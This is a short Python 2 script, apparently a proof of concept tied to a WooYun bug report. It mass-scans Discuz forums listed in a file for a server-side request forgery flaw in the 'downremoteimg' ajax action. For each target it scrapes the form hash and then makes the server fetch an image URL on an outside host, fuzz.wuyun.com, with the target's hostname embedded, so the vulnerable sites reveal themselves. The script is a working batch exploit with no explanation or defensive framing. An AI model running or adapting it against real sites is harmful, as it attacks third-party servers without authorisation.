#!/usr/bin/env python

# encoding: utf-8
#http://wooyun.org/bugs/wooyun-2016-0218421


import urlparse

import random

import time

import re



import requests

from utils.fileutils import FileUtils



import requests.packages.urllib3

requests.packages.urllib3.disable_warnings()



for website in FileUtils.getLines('qqdz.lst'):

    request = requests.session()

    try:

        forumurl = "{website}/forum.php".format(website=website)

        response = request.get(forumurl, timeout=5, verify=False)

        formhash = re.findall(r'formhash" value="(.*?)"',response.content)

        netloc = urlparse.urlparse(website).netloc

        payload = 'http://fuzz.wuyun.com/404.php?s={netloc}.jpg'.format(netloc=netloc)

        url = "{website}/forum.php?mod=ajax&action=downremoteimg&formhash={formhash}&message=[img]{payload}[/img]".format(

            website=website,

            formhash=formhash[0] if formhash else '',

            payload=payload)

        response = request.get(url, timeout=5, verify=False)

        print url, len(response.content)

    except Exception, e:

        print website, e
